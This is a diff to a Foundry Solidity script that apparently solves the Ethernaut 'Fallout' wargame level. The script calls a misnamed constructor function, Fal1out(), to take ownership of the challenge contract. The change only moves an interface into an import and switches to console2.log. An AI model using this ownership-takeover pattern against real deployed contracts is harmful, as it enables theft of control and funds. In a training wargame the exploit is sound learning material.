@@ -3,12 +3,7 @@
 pragma solidity ^0.8.17;
 
 import "forge-std/Script.sol";
-
-interface IFallout {
-    function Fal1out() external payable;
-
-    function owner() external view returns (address);
-}
+import {IFallout} from "src/hack/interfaces/IFallout.sol";
 
 contract HackFalloutScript is Script {
     function run() external {
@@ -17,6 +12,6 @@ contract HackFalloutScript is Script {
         vm.startBroadcast(deployerKey);
         fallout.Fal1out();
         vm.stopBroadcast();
-        console.log("SUCCESS!!! Submit the instance.");
+        console2.log("SUCCESS!!! Submit the instance.");
     }
 }
